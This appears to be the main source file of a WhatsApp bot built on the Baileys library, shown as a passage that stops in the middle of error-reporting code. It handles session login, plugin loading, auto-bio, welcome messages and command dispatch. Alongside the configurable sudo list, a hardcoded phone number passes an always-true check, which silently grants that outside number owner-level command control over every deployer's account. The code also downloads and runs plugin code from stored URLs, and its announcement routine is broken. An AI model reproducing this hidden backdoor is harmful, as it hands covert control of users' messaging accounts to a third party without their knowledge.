/* Copyright (C) 2021 TENUX-Neotro.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
NEOTROX - TEENUHX
*/

const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const got = require('got');

// ════════════════════SQL◽◽◽◽
const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94766598862,0' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
// ════════════════════WA CONNECTION◽◽◽◽    
    const conn = new WAConnection();
    conn.version = [2, 2123, 8];
    const Session = new StringSession();

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('👩‍🦰Login information updated!▶')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Hatzu')}${chalk.blue.bold('Hole')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...▶')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('👩‍🦰 Login successful!▶')
        );

        console.log(
            chalk.blueBright.italic('🚀Installing external plugins...▶')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('🤖Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
// ════════════════════PLUGGINS SUCCESS◽◽◽◽
        console.log(
            chalk.green.bold('👩‍🦰AMAZONE ALEXA working!')
       );
        
         if (config.LANG == 'EN') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/Amazone.png"), MessageType.image, { caption: `🛸🚀Hey..!!  ${conn.user.name}! \n*🧞‍♀️Welcome To Amazon Alexa :|🌼*\n Your Bot Working  As ${config.WORKTYPE} 👩‍🦰.\n\n*🛸Amozon Alexa WORKING Your Account*\n*👩‍🦰Use the 🚀.basichelp command to get a full understanding of the Amazon Alexa testimonial...*\n*👩‍🦰Amazon Alexa is a powerfull WhatsApp robot developed by insaaf.*\n*🚀 This is your LOG number. Avoid using the command here.*\n\n`});
             
         } else if (config.LANG == 'SI') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/Amazone.png"), MessageType.image, { caption: `🛸🚀Hey..!!  ${conn.user.name}! \n*🧞‍♀️සාදරයෙන් Amazone Alexa වෙත පිලිගන්නවා :|🌼*\n\n ඔබේ Bot ${config.WORKTYPE} ලෙස ක්‍රියාකරයි.\n*🛸Amozon Alexa ඔබගේ ගිණුමේ දැන් සක්‍රියයි*\n*💠Amazone Alexa පිළිබද සම්පූර්ණ අවබෝධයක් ලබා ගැනීමට 🔶.basichelp විධානය භාවිතා කරන්න...*\n*🌟Amazone Alexa යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි..Alexa වෙත ලැබෙන නව අංග හා යතාවත්කාලින කිරිම් ලබා ගැනීමට 🔶 .newslist විධානය භාවිතා කරන්න..*\n*🚀මෙය ඔබගේ LOG අංකයයි.මෙහි විධාන භාවිතයෙන් වළකින්න.*\n\n`});
             
         } else {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/Amazone.png"), MessageType.image, { caption: `🛸🚀Hey..!!  ${conn.user.name}! \n*🧞‍♀️Welcome To Amazon Alexa :|🌼*\n Your Bot Working  As ${config.WORKTYPE} 👩‍🦰.\n\n*🛸Amozon Alexa WORKING Your Account*\n*👩‍🦰Use the 🚀.basichelp command to get a full understanding of the Amazon Alexa testimonial...*\n*👩‍🦰Amazon Alexa is a powerfull WhatsApp robot developed by insaaf.*\n*🚀 This is your LOG number. Avoid using the command here.*\n\n`});
        }
     });
    
// ════════════════════LOGIN MESSAGE◽◽◽◽
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            if (conn.user.jid.startsWith('90')) { 
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { 
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio B... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { 
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By Whitedevil'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('91')) { 
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { 
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) {  
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { 
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { 
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) {  
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) {  
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By ... 🚀powered By Amazone Alexa'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
// ════════════════════AUTO BIO◽◽◽◽◽    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 19 && getGMTm == 1) {
            var announce = ''
            if (config.LANG == 'EN') announce = '📢◉◉👩‍🦰ᴀᴍᴀᴢᴏɴᴇ ᴀʟᴇxᴀ◉◉ \n👾Announcement SYSTEM 🔘'
            if (config.LANG == 'SI') announce = '📢◉◉👩‍🦰ᴀᴍᴀᴢᴏɴᴇ ᴀʟᴇxᴀ◉◉ \n👾නිවේදන පද්ධතිය 🔘'
            if (config.LANG == 'ID') announce = '📢◉◉👩‍🦰ᴀᴍᴀᴢᴏɴᴇ ᴀʟᴇxᴀ◉◉ \n👾Announcement System 🔘'
            
            let video = 'https://imgur.com/u9LLLGV.mp4'
            let image = 'https://telegra.ph/file/e8f3e419b3dafe9fe8153.jpg'
            
            if (video.includes('http') || video.includes('https')) {
                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['1080p','720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.mp4});
                });
            } else {
                if (image.includes('http') || image.includes('https')) {
                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: announce })
                } else {
                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
                }
            }
        }
    }, 50000);
 // ════════════════════ANNOUNCEMENT◽◽◽◽◽   
    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
// ════════════════════NO ONLINE◽◽◽◽◽ 

        if (config.WELCOME == 'pp' || config.WELCOME == 'Pp' || config.WELCOME == 'PP' || config.WELCOME == 'pP' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    // Thanks to Lyfe
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    // welcome
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                       let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
                    }
                    return;
                }
            }
            else if (config.WELCOME == 'gif' || config.WELCOME == 'Gif' || config.WELCOME == 'GIF' || config.WELCOME == 'GIf' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        var tn = await axios.get(config.BYE_GIF, { responseType: 'arraybuffer' })
                        await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                    var tn = await axios.get(config.WELCOME_GIF, { responseType: 'arraybuffer' })
                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                }
             }
// ════════════════════WELCOME & GOODBYE◽◽◽◽◽
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {
// ════════════════════VIDEO & IMAGE◽◽◽◽◽◽
                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                     
                    if ((OWN.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
// ════════════════════SUDO◽◽◽◽◽  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '*-- බොට් වාර්තාව [🎭Neotro-X] --*' + 
                                    '\n*🎭Neotro-X නිසි ලෙස ක්‍රියා කරයි!*'+
                                    '\n_මෙය ඔබගේ LOG අංකයයි! _මෙහි විධාන භාවිතයෙන් වළකින්න_' +
                                    '\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතාබහක විධාන භාවිතා කරන්න._' +
                                    '\n_වැඩි දුර උදව් සදහා සහය සමූහයට එකතු වෙන්න._' +
                                    '\n_සහය සමූහය: https://chat.whatsapp.com/GTgqgMTo7FoJ1GqdijshsX_\n\n' +
                                    '*🚫ප්‍රධාන දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚜ 🙇දෝශ විශ්ලේෂනය [🎭Neotro-X] ⚜*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Only Absolutely URLs Supported_' +
                                        '\n*🤖හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (nmedia, sticker..) භාවිතය._' +
                                        '\n*🧚‍♂️විසඳුම:* _LOG අංකය හැර ඕනෑම චැට් එකකදී ඔබට විධානයන් භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _SQL Database Error_' +
                                        '\n*🤖හේතුව:* _Database\'දෝශයකි._ ' +
                                        '\n*🧚‍♂️විසඳුම:* _නිශ්චිත විසදුමක් නොමැත..ඔබට හැකියි නැවත යෙදුම්ගත කිරීමට._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Split of Undefined_' +
                                        '\n*🤖හේතුව:* _කණ්ඩායම් admin භාවිතා කළ හැකි විධානයන් සමහර විට split ක්‍රියාවලිය නොදකි._ ' +
                                        '\n*🧚‍♂️විසඳුම:* _Restart කිරීම ප්‍රමාණවත් වේ._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Ookla Server Connection_' +
                                        '\n*🤖හේතුව:* _සේවාදායකයට වේගවත්ම දත්ත සම්ප්‍රේෂණය කළ නොහැක._' +
                                        '\n*🧚‍♂️විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කළහොත් ගැටළුව විසඳනු ඇත.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Requested Audio Params_' +
                                        '\n*🤖හේතුව:* _හෝඩියේ පිටත TTS විධානය භාවිතා කිරීම._' +
                                        '\n*🧚‍♂️විසඳුම:* _ඔබ අකුරු රාමුව තුළ ඇති විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _No Such File or Directory_' +
                                        '\n*🤖හේතුව:* _Pluginයේ වැරදි කේතීකරණය._' +
                                        '\n*🧚‍♂️විසඳුම:* _කරුණාකර ඔබේ plugin කේත පරීක්‍ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Error 404 HTTPS_' +
                                        '\n*🤖හේතුව:* _Heroku plugins යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*🧚‍♂️විසඳුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවිය මඟින් යලි ආරම්භ කිරීම සිදු කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
                                        '\n*🧚‍♂️විසඳුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය fatal error නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
                                        '\n*🧚‍♂️විසඳුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය fatal error නොවේ.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Bailyes Action Error_ ' +
                                        '\n*🤖හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප එකකට වඩා මෙම දෝෂය ඇති වීමට හේතු විය හැක._' +
                                        '\n*🧚‍♂️විසඳුම:* _ඔබ එය නැවත භාවිතා කළහොත් එය වැඩිදියුණු විය හැකිය. දෝෂය දිගටම පැවතුනහොත්, ඔබට restart කිරීමට උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Cannot Decode Text or Media_' +
                                        '\n*🤖හේතුව:* _වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*🧚‍♂️විසඳුම:* _විධාන ලැයිස්තුවෙ විස්තර ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Word Character Usage_' +
                                        '\n*🤖හේතුව:* _English හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
